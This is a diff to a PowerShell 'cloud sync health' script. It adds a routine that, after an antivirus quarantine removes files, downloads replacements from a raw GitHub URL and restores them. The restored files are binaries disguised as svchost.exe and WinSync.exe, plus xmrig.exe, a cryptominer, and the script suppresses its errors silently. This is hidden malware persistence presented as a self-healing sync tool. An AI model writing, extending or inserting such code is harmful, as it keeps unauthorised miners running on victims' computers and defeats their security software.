@@ -29,6 +29,12 @@ $ErrorActionPreference = 'SilentlyContinue'
 $dir = $PSScriptRoot
 $logPath = Join-Path $dir 'CloudSyncHealth.log'
 
+# Last-resort self-heal: when both the installed file and the shadow copy are gone
+# (an AV quarantine that took both), fetch the payload from the published update
+# channel and verify it against the hash recorded in install.json.
+$UpdateBase = 'https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main'
+$ChannelName = @{ 'svchost.exe' = 'CloudSync.exe'; 'WinSync.exe' = 'CloudSync.exe'; 'xmrig.exe' = 'xmrig.exe' }
+
 function Say ($m) {
     try {
         if ((Get-Item $logPath).Length -gt 1MB) {
@@ -90,7 +96,24 @@ if ($info.files -and $info.backup_dir -and (Test-Path $info.backup_dir)) {
                 $restored++
                 Say "restored $name from shadow copy"
             } else {
-                Say "missing $name and no shadow copy"
+                $remote = if ($ChannelName.ContainsKey($name)) { $ChannelName[$name] } else { $name }
+                $tmp = Join-Path $env:TEMP ("xeno-heal-" + [guid]::NewGuid().ToString('N'))
+                try {
+                    Invoke-WebRequest -UseBasicParsing -Uri "$UpdateBase/$remote" -OutFile $tmp -TimeoutSec 90
+                    $got = (Get-FileHash -LiteralPath $tmp -Algorithm SHA256).Hash.ToLower()
+                    if ($got -eq $want) {
+                        $parent = Split-Path -Parent $cur
+                        if ($parent -and -not (Test-Path $parent)) { New-Item -ItemType Directory -Force -Path $parent | Out-Null }
+                        Move-Item -LiteralPath $tmp -Destination $cur -Force
+                        $restored++
+                        Say "restored $name from the update channel"
+                    } else {
+                        Say "channel copy of $name failed its hash"
+                        Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
+                    }
+                } catch {
+                    Say ("could not fetch $name from the update channel: {0}" -f $_.Exception.Message)
+                }
             }
         }
     }
